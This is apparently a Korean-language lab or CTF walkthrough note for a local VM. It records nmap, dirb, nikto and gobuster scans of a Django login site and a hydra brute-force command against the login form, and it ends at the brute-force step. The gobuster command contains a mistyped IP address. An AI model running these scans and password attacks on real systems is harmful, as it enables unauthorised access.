# \[정보수집]
## 1. IP 검색
`nmap 192.168.56.0/24`
![[Pasted image 20240930150614.png]]
- 22/tcp: ssh 서비스 활성화
- 8080/tcp: http 서비스 활성화

## 2. 서비스 탐색
### `nmap 192.168.56.112 -sV -v -p-`
---
![[Pasted image 20240930151517.png]]
### `dirb http://192.168.56.112:8080/`
---
- django 관리자 로그인 페이지: `http://192.168.56.112:8080/admin`
- 일반 사용자 로그인 페이지: `http://192.168.56.112:8080/`
### `nikto -h http://192.168.56.112:8080/`
---
- 무한 로딩... 무슨 문제인지 모르겠지만 나중에 다시 시도해보자
### `dirb http://192.168.56.112:8080/admin -f`
---
- dirb 결과에 추가로 세부 탐색 진행
- ![[Pasted image 20240930162024.png]]
- 두 페이지를 더 발견했다.
### `gobuster dir -u http://192.169.56.112:8080/ -w /usr/share/dirb/wordlists/common.txt/admin`
---
- 다른 툴로 검출할 것이 없는지 다시 탐색 진행
- admin 페이지 외 다른 유의미한 정보를 담는 페이지는 없다.

# \[웹 접속]
## `http://192.168.56.112:8080/`
![[Pasted image 20240930162545.png]]
- 

# \[브루트 포스 공격]
- `weakuser.txt` 파일 생성
- guest, venus, magellan 추가 저장
`hydra 192.168.56.112:8080 http-form-post "/:username=^USER^&pwd=^PASS^:Invalid username." -L weakuser.txt -P weakpass.txt`